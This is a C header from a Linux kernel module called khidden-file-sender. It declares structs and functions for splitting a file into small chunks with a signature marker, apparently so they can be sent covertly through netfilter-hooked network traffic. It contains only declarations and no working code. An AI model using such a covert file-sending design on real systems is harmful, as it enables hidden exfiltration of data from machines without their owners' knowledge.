/**
 * This file is part of the khidden-file-sender module (https://github.com/spiderpig1297/khidden-file-sender).
 * Copyright (c) 2020 Idan Ofek.
 * 
 * This program is free software: you can redistribute it and/or modify  
 * it under the terms of the GNU General Public License as published by  
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but 
 * WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU 
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License 
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */
#pragma once

#include "../net/netfilter.h"

static size_t DEFAULT_PAYLOAD_CHUNKS_SIZE = 32;  // in bytes
static const char DEFAULT_NEW_FILE_SIGNATURE[] = { 0xDE, 0xAD, 0xBE, 0xEF };

struct new_file_signature {
    const char signature[4];
    size_t file_size;
    // TODO: add an id for the file? to recognize it?
};

struct file_chunk {
    const char *data;
    size_t chunk_size;
    size_t chunk_number;
    size_t total_chunks_number;
    struct list_head l_head;
};

// struct for storing all needed information on the file that 
// is currently being sent.
// TODO: handle a case where the file is dynamic - pos / file_path changes
struct current_file_cache {
    size_t position;
    const char *file_path;
    struct list_head chunks;
};

// assumes that the caller has already allocated enough space for the payload
int generate_payload(char *buffer, size_t *length);

void setup_payload_generator(void);

size_t get_default_payload_chunk_size(void);
